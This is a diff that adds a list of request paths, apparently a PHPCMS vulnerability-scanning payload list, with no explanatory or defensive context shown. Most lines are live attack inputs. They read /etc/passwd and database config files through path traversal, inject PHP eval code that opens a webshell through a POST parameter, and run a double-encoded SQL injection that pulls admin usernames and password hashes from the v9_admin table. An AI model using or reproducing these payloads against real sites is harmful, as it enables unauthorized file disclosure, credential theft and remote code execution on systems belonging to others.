@@ -1,0 +1,16 @@
+/api.php?op=ajax_domain&url=/etc/passwd
+/api.php?op=ajax_domain&url=caches/configs/system.php
+/api.php?op=ajax_domain&url=phpsso_server/caches/configs/uc_config.php
+/api.php?op=add_favorite&url=wooyun.in&title=%2527
+/index.php?m=admin&c=index&a=login&pc_hash=MUPmkU
+/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
+/admin?mod=phpcms&file=index&action=index
+/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../caches/configs/database.php
+/login.php?mod=phpcms&file=login
+/index.php?m=member&c=index&a=register&siteid=1
+/phpsso_server/api.php?op=uc
+/robots.txt
+/cache/adminlogin_logs.php
+/cache/admin_logs.php
+/product.php?pagesize=${${@eval%28$_POST[heixiaozi]%29}} 
+/api.php?op=add_favorite&url=v9&title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520v9_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271
